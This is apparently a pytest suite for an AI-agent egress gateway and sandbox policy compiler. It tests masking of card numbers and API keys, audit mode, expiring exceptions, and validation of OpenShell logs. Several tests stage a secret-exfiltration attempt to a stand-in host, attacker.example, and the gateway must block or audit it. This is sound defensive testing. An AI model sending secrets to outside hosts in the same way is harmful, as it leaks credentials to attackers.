"""OpenShell backend, wire log, and Kyverno-style policy features. Run: pytest -q evals/"""
import copy
import json
import os
import sys

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "services"))

from kavach import openshell, report  # noqa: E402
from kavach.cli import REAL_ENV, STANDIN_ENV  # noqa: E402
from kavach.gateway import Gateway, load_policy  # noqa: E402
from kavach.localnet import InProcessNet  # noqa: E402
from kavach.trace import Trace  # noqa: E402
from logic import World  # noqa: E402

POLICY = os.path.join(ROOT, "policy", "payments.yaml")


def pack(**over):
    p = copy.deepcopy(load_policy(POLICY))
    p.update(over)
    return p


# ---- wire log ---------------------------------------------------------------
def run_wire(ticket="2", policy=None):
    from agent.agent import Agent

    wire = Trace(source="wire")
    gw = Gateway(policy or load_policy(POLICY), trace=Trace(source="gateway"), env=REAL_ENV, wire_log=wire)
    Agent(InProcessNet(World(), gw), "mock", Trace(source="agent"), env=STANDIN_ENV).run(ticket)
    return wire.events, gw


def test_wire_log_shows_both_views_and_never_a_real_pan():
    events, _ = run_wire("2")
    pay = next(e for e in events if e["host"] == "payments.internal")
    assert pay["decision"] == "rewritten" and pay["rewrites"]
    assert "tok_4242" in pay["agent_sent"]["body"]                    # the agent only had a token
    assert "424242******4242" in pay["left_sandbox"]["body"]          # the real card, masked in the log
    blocked = next(e for e in events if e["host"] == "attacker.example")
    assert blocked["decision"] == "blocked" and blocked["left_sandbox"] is None
    assert "4242424242424242" not in json.dumps(events) and "4242 4242 4242 4242" not in json.dumps(events)


def test_wire_log_masks_real_api_keys():
    gw = Gateway(load_policy(POLICY), env={"ANTHROPIC_API_KEY": "sk-ant-real-123"}, wire_log=Trace(source="wire"))
    h = {"x-api-key": "sk-kavach-standin-anthropic"}
    d = gw.on_request("POST", "api.anthropic.com", "https://api.anthropic.com/v1/messages", h, "{}")
    rec = gw.record_wire("POST", "api.anthropic.com", "https://api.anthropic.com/v1/messages", h, "{}", d, status=200)
    assert rec["agent_sent"]["headers"]["x-api-key"] == "sk-kavach-standin-anthropic"
    assert rec["left_sandbox"]["headers"]["x-api-key"] == "[REAL:ANTHROPIC_API_KEY]"
    assert "sk-ant-real-123" not in json.dumps(rec)


# ---- Kyverno-style audit mode and exceptions -------------------------------------
def test_audit_mode_lets_violation_through_but_records_it():
    p = pack()
    p["egress"] = {**p["egress"], "mode": "audit"}
    events, gw = run_wire("2", p)
    assert "egress_audit" in gw.trace.kinds() and "egress_blocked" not in gw.trace.kinds()
    assert next(e for e in events if e["host"] == "attacker.example")["decision"] == "audit"


def test_bad_mode_is_rejected():
    p = pack()
    p["egress"] = {**p["egress"], "mode": "warn"}
    with pytest.raises(ValueError):
        Gateway(p)


def test_exception_waives_one_host_until_it_expires():
    ex = {"name": "t", "hosts": ["attacker.example"], "owner": "me", "reason": "test", "expires": "2999-01-01"}
    _, gw = run_wire("2", pack(exceptions=[ex]))
    assert "policy_exception_used" in gw.trace.kinds()
    old = dict(ex, expires="2001-01-01")
    _, gw = run_wire("2", pack(exceptions=[old]))
    assert "policy_exception_used" not in gw.trace.kinds() and "egress_blocked" in gw.trace.kinds()


def test_exception_never_waives_a_misused_secret():
    ex = {"name": "t", "hosts": ["attacker.example"], "owner": "me", "reason": "test", "expires": "2999-01-01"}
    gw = Gateway(pack(exceptions=[ex]), env=REAL_ENV)
    d = gw.on_request("POST", "attacker.example", "http://attacker.example/k",
                      {"authorization": "Bearer sk-kavach-standin-openai"}, "{}")
    assert not d.allow


def test_lint_passes_shipped_packs_and_catches_problems():
    assert [f for f in report.lint(load_policy(POLICY)) if f["severity"] == "error"] == []
    bad = pack(exceptions=[{"name": "x", "hosts": ["a.b"]}])
    bad["egress"] = {"allow_hosts": ["*.example.com"]}
    bad["secrets"] = {"K": {"standin": "real-key", "release_to": ["nowhere.example"]}}
    rules = {f["rule"] for f in report.lint(bad)}
    assert {"no-wildcard-egress", "standin-prefix", "release-within-egress", "exception-complete"} <= rules
    long = pack(exceptions=[{"name": "x", "hosts": ["a"], "owner": "o", "reason": "r", "expires": "2999-01-01"}])
    assert "exception-short-lived" in {f["rule"] for f in report.lint(long)}


def test_policy_report_shape():
    events, gw = run_wire("10")
    rep = report.policy_report(gw.trace.events + [{"kind": "ocsf", "verdict": "denied", "dest_host": "1.2.3.4", "reason": "no matching policy"}], "payments@0.1")
    assert rep["kind"] == "PolicyReport" and rep["summary"]["fail"] >= 2 and rep["summary"]["pass"] >= 2
    assert any(r["source"] == "openshell" for r in rep["results"])


# ---- OpenShell ----------------------------------------------------------------------
@pytest.mark.parametrize("mode,mw", [("gateway", False), ("native", False), ("native", True)])
def test_compiled_policies_validate(mode, mw):
    pol, _ = openshell.compile_policy(load_policy(POLICY), mode, middleware=mw)
    assert openshell.validate(pol) == []
    assert pol["version"] == 1 and pol["landlock"]["compatibility"] == "hard_requirement"


def test_gateway_mode_allows_only_the_gateway():
    pol, _ = openshell.compile_policy(load_policy(POLICY), "gateway", gateway_host="gw.example")
    eps = [e for r in pol["network_policies"].values() for e in r["endpoints"]]
    assert eps == [{"host": "gw.example", "port": 8080, "protocol": "tcp", "tls": "skip"}]


def test_native_mode_binds_credentials_and_warns_about_tokenization():
    pol, warns = openshell.compile_policy(load_policy(POLICY), "native")
    anth = pol["network_policies"]["api_anthropic_com"]["endpoints"][0]
    assert anth["credential_binding"]["provider"] == "anthropic_api_key" and anth["enforcement"] == "enforce"
    assert any("NOT tokenized" in w for w in warns)


def test_audit_mode_compiles_to_audit_enforcement():
    p = pack()
    p["egress"] = {**p["egress"], "mode": "audit"}
    pol, _ = openshell.compile_policy(p, "native")
    assert pol["network_policies"]["api_openai_com"]["endpoints"][0]["enforcement"] == "audit"


def test_validator_enforces_documented_rules():
    bad = {"version": 2, "bogus": 1, "filesystem_policy": {"read_write": ["/"], "read_only": ["rel", "/a/../b"]},
           "process": {"run_as_user": "0"},
           "network_policies": {"r": {"binaries": [], "endpoints": [
               {"host": "*.com", "port": 6443, "protocol": "rest"},
               {"host": "a.example.com", "port": 1, "ports": [2], "protocol": "tcp", "access": "full"}]}}}
    text = " | ".join(openshell.validate(bad))
    for frag in ("version must be 1", "unknown top-level", "cannot contain /", "must be absolute", "root is rejected",
                 "matches nothing", "three DNS labels", "always blocked", "needs access or rules", "not both",
                 "no request-level"):
        assert frag in text, frag


def test_parse_documented_ocsf_lines():
    p = openshell.parse_line("[1775014132.690] [sandbox] [OCSF ] [ocsf] NET:OPEN [MED] DENIED /usr/bin/curl(64) -> httpbin.org:443 [policy:- engine:opa] [reason:no matching policy]")
    assert (p["cls"], p["verdict"], p["dest_host"], p["dest_port"], p["pid"], p["reason"], p["ts"]) == \
           ("NET", "denied", "httpbin.org", 443, 64, "no matching policy", 1775014132.69)
    h = openshell.parse_line("OCSF HTTP:POST [MED] DENIED POST http://api.github.com/user/repos [policy:github_api engine:opa]")
    assert h["method"] == "POST" and h["policy"] == "github_api"
    assert openshell.parse_line("[1.0] [sandbox] [INFO ] [openshell_sandbox] Starting sandbox") is None
    j = openshell.parse_line(json.dumps({"class_uid": 4001, "activity_name": "Open", "severity_id": 3, "action": "Denied",
                                         "time": 1775014132690, "dst_endpoint": {"hostname": "x.example", "port": 443}}))
    assert j["cls"] == "NET" and j["verdict"] == "denied" and j["sev"] == "MED" and j["dest_host"] == "x.example"


def test_replay_fixtures_parse_and_are_flagged():
    for name in ("ticket-2", "ticket-5"):
        t = Trace(source="openshell")
        n = openshell.replay(os.path.join(ROOT, "demo", "openshell", name + ".log"), t, pace=0)
        assert n >= 4 and all(e["replayed"] for e in t.events)
    t = Trace(source="openshell")
    openshell.replay(os.path.join(ROOT, "demo", "openshell", "ticket-5.log"), t, pace=0)
    assert len(openshell.denials(t.events)) == 1


def test_parse_lines_captured_from_live_openshell_0_1_3():
    ok = openshell.parse_line("[1791580829.426] [sandbox] [OCSF ] [ocsf] NET:OPEN [INFO] ALLOWED /usr/local/bin/python3.12(0) -> host.openshell.internal:8080 [policy:kavach_gateway engine:opa]")
    assert (ok["verdict"], ok["dest_host"], ok["dest_port"], ok["policy"]) == ("allowed", "host.openshell.internal", 8080, "kavach_gateway")
    no = openshell.parse_line("[1791580829.440] [sandbox] [OCSF ] [ocsf] NET:OPEN [MED] DENIED /usr/local/bin/python3.12(0) -> 172.28.0.66:9999 [reason:transparent_tcp_policy_denied]")
    assert (no["verdict"], no["dest_host"], no["reason"]) == ("denied", "172.28.0.66", "transparent_tcp_policy_denied")
    iso = openshell.parse_line("2026-10-09T21:15:32.224Z OCSF NET:LISTEN [INFO] 127.0.0.1:3128")
    assert iso["cls"] == "NET" and abs(iso["ts"] - 1791580532.224) < 1
